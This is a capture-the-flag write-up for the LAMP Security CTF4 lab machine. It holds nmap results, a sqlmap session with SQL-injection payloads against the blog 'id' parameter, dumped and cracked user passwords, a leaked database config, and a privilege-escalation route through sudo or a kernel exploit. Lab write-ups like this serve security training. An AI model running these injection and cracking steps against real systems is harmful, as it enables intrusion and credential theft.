@@ -1,0 +1,241 @@
+LAMP CTF 4:
+time taken: ~ 2 hours
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-10 17:39 MDT
+Nmap scan report for ctf03.root-me.org (212.129.29.185)
+Host is up (0.036s latency).
+Not shown: 996 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
+|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
+25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
+| smtp-commands: localhost.localdomain Hello [205.170.0.29], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
+|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
+80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
+| http-robots.txt: 5 disallowed entries 
+|_/mail/ /restricted/ /conf/ /sql/ /admin/
+|_http-server-header: Apache/2.2.0 (Fedora)
+|_http-title:  Prof. Ehks 
+631/tcp closed ipp
+Device type: general purpose
+Running: QEMU
+OS CPE: cpe:/a:qemu:qemu
+OS details: QEMU user mode network gateway
+Network Distance: 2 hops
+Service Info: Host: localhost.localdomain; OS: Unix
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   2.13 ms 10.0.2.2
+2   2.27 ms ctf03.root-me.org (212.129.29.185)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.82 seconds
+
+robots.txt:
+
+User-agent: *
+Disallow: /mail/ --> http://ctf03.root-me.org/mail/src/login.php
+Disallow: /restricted/
+Disallow: /conf/
+Disallow: /sql/
+Disallow: /admin/
+
+
+db.sql:
+
+use ehks;
+create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
+create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
+create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
+
+SQLMAP:
+
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 355 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=blog&title=Blog&id=6 AND 7663=7663
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=blog&title=Blog&id=6 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: page=blog&title=Blog&id=6 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787a71,0x4f4250534b7252624474554c444c6f734e6f47776f536c6e6b4c5576596642724f78586476616b50,0x71716a6271),NULL-- jGTo
+---
+[17:56:12] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 5 (Bordeaux)
+web application technology: Apache 2.2.0, PHP 5.1.2
+back-end DBMS: MySQL >= 5.0.12
+[17:56:12] [INFO] fetching columns for table 'user' in database 'ehks'
+Database: ehks
+Table: user
+[3 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| user_id   | int(11)     |
+| user_name | varchar(20) |
+| user_pass | varchar(32) |
++-----------+-------------+
+
+[17:56:12] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf03.root-me.org'
+
+[*] shutting down at 17:56:12
+
+
+root@kdog:~# sqlmap -u "http://ctf03.root-me.org/index.html?page=blog&title=Blog&id=6" --dump -D ehks -T user
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.1.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:57:23
+
+[17:57:23] [INFO] resuming back-end DBMS 'mysql' 
+[17:57:23] [INFO] testing connection to the target URL
+[17:57:24] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=blog&title=Blog&id=6 AND 7663=7663
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=blog&title=Blog&id=6 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: page=blog&title=Blog&id=6 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787a71,0x4f4250534b7252624474554c444c6f734e6f47776f536c6e6b4c5576596642724f78586476616b50,0x71716a6271),NULL-- jGTo
+---
+[17:57:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 5 (Bordeaux)
+web application technology: Apache 2.2.0, PHP 5.1.2
+back-end DBMS: MySQL >= 5.0.12
+[17:57:24] [INFO] fetching columns for table 'user' in database 'ehks'
+[17:57:24] [INFO] fetching entries for table 'user' in database 'ehks'
+[17:57:24] [INFO] analyzing table dump for possible password hashes
+[17:57:24] [INFO] recognized possible password hashes in column 'user_pass'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[17:57:34] [INFO] writing hashes to a temporary file '/tmp/sqlmapeZC9cr6257/sqlmaphashes-68JwL3.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[17:57:38] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[17:57:46] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[17:57:50] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[17:57:50] [INFO] starting 2 processes 
+[17:57:51] [INFO] cracked password 'Sue1978' for user 'jdurbin'                                                                                                            
+[17:57:52] [INFO] cracked password 'Homesite' for user 'pmoore'                                                                                                            
+[17:57:54] [INFO] cracked password 'convertible' for user 'sorzek'                                                                                                         
+[17:57:55] [INFO] cracked password 'undone1' for user 'ghighland'                                                                                                          
+[17:57:55] [INFO] cracked password 'ilike2surf' for user 'dstevens'                                                                                                        
+[17:57:57] [INFO] cracked password 'seventysixers' for user 'achen'                                                                                                        
+[17:57:59] [INFO] postprocessing table dump                                                                                                                                
+Database: ehks
+Table: user
+[6 entries]
++---------+-----------+--------------------------------------------------+
+| user_id | user_name | user_pass                                        |
++---------+-----------+--------------------------------------------------+
+| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
+| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
+| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
+| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
+| 5       | sorzek    | e0a23947029316880c29e8533d8662a3 (convertible)   |
+| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
++---------+-----------+--------------------------------------------------+
+
+[17:57:59] [INFO] table 'ehks.`user`' dumped to CSV file '/root/.sqlmap/output/ctf03.root-me.org/dump/ehks/user.csv'
+[17:57:59] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf03.root-me.org'
+
+[*] shutting down at 17:57:59
+
+USERNAME: pmoore
+PASSWORD: Homesite
+
+-
+webmail_instructions.txt:
+Instructions for Webmail
+========================
+
+Browse to the URL /mail
+Log in with your regular machine credentials (username and password).
+Use webmail ;)
+
+Let Don or James know if you're having problems.
+
+blog_instructions:
+
+Instructions for Posting to the Blog
+====================================
+
+Just log into the admin section at /admin.
+Use your regular machine credentials (username and password).
+Once you're logged in click the "Blog" link.
+
+in ssh, config.ini:
+
+dbhost	=	localhost
+db		=	ehks
+dbuser	=	root
+dbpass	=	database
+
+.htaccess:
+Order deny, allow
+Deny from all
+
+pmoore squirrelmail:
+
+
+
+Hello all,
+
+  the server is up and running now and should be able to support most of
+our needs.  Don and I are still working on installing a few more patches
+and configuring things.  Let us know if you have any problems.  Thanks!
+
+-- 
+Don Stevens
+Sr. Unix Admin
+Prof. Ehks Data Research Center
+
+
+
+
+a lot fo things here. ANYWAY
+
+login with any of the passwords. I did 
+USERNAME: pmoore
+PASSWORD: Homesite
+
+2 WAYS TO ROOT:
+
+EASY WAY: 
+    sudo su, enter ssh password (boring)
+
+FUN WAY:
+    uname -r leads me to choose https://www.exploit-db.com/exploits/9542/ 
+    upload it somehow (scp is good), then run.
+
+
+
+
+
+
